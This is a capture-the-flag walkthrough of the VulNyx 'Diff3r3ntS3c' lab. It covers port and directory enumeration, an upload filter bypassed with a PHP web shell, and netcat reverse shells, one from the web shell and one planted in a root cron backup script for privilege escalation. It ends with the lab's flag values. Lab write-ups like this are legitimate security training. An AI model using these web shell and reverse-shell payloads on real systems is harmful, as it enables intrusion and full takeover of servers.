# VulNyx - Diff3r3ntS3c

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.20
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 22:35 +07
Nmap scan report for 192.168.11.20
Host is up (0.0097s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Diff3r3ntS3c

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.11 seconds
```

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.20/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://192.168.11.20/images/]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.11.20/uploads/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.11.20/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
#### Web
![web](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/web.png)

### Shell
#### Insecure File Upload
![file upload web](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/file-upload-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ for i in php php5 phtml phar ; do echo -n '<?php system($_GET["cmd"]); ?>' > exploit.$i ; done

┌──(dungcngo㉿kali)-[/tmp]
└─$ ls -l        
total 16
-rw------- 1 dungcngo dungcngo  0 May  6 22:20 config-err-2SJfal
-rw-rw-r-- 1 dungcngo dungcngo 30 May  7 03:01 exploit.phar
-rw-rw-r-- 1 dungcngo dungcngo 30 May  7 03:01 exploit.php
-rw-rw-r-- 1 dungcngo dungcngo 30 May  7 03:01 exploit.php5
-rw-rw-r-- 1 dungcngo dungcngo 30 May  7 03:01 exploit.phtml
```

When trying to upload a file with the `.php` extension, it is not allowed.
![upload file php](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/upload-php.png)

We successfully uploaded the file with the `.phar`, `.php5` or `.phtml` extension:

![uploads web](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/uploads-web.png)

#### Reverse shell
![uploads web](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/uploads-web-1.png)

We are trying to get a reverse shell by running commands.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://192.168.11.20/uploads/3/exploit.phtml?cmd=nc+192.168.11.10+4444+-e+/bin/sh"
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.20] 43884
id ; hostname
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
Diff3r3ntS3c
script /dev/null -qc /bin/bash 
candidate@Diff3r3ntS3c:/var/www/html/uploads/3$ 
```

### Privilege Escalation
#### Enumeration
```bash
candidate@Diff3r3ntS3c:/var/www/html/uploads/3$ cd /
candidate@Diff3r3ntS3c:/$ sudo -l
bash: sudo: command not found
candidate@Diff3r3ntS3c:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
```

#### Abuse
![abuse](/walkthroughs/vulnyx/low-difficulty/23_diff3r3ntS3c/abuse.png)

```bash
candidate@Diff3r3ntS3c:/$ cat /home/candidate/.scripts/makeBackup.sh
#!/bin/bash

# Source folder to be backed up
source_folder="/var/www/html/uploads/"

# Destination folder for the backup
backup_folder="/home/candidate/.backups/"

# Create backup folder if it doesn't exist
mkdir -p "$backup_folder"

# Backup file name
backup_file="${backup_folder}backup.tar.gz"

# Create a compressed tar archive of the source folder
tar -czf "$backup_file" -C "$source_folder" .

busybox nc 192.168.11.10 4444 -e sh
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.20] 60800
id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
Diff3r3ntS3c
```

#### Flags
```bash
script /dev/null -qc /bin/bash
root@Diff3r3ntS3c:~# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
24886c4b2777d4359cd3dbd118741dda
9b71bc22041491a690f7c7b5fe0f4e8d
```

***You are welcome!***
